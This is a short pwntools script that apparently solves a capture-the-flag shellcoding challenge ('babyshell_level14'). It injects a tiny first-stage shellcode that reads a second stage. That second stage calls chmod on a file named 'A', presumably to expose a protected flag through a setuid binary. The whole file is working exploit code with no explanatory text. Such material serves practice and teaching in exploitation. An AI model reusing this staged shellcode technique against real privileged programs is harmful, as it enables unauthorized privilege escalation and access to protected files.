from pwn import *

context.arch = 'amd64'
#context.log_level = "debug"

p = process('/challenge/babyshell_level14')

shellcode = """
    push rax
    pop rdi
    push rdx
    pop rsi
    syscall
"""

# Assemble the shellcode
shellcode = asm(shellcode)
#print(shellcode)
#print("\n\nlength of code is \n\n",len(shellcode))

p.send(shellcode)

shellcode =asm( 
"""
    push 0x41
    mov rdi, rsp
    mov sil, 0x4
    mov al, 0x5a
    syscall
"""
)
payload=b'a'*6+shellcode

p.send(payload)

# Interact with the process
p.interactive()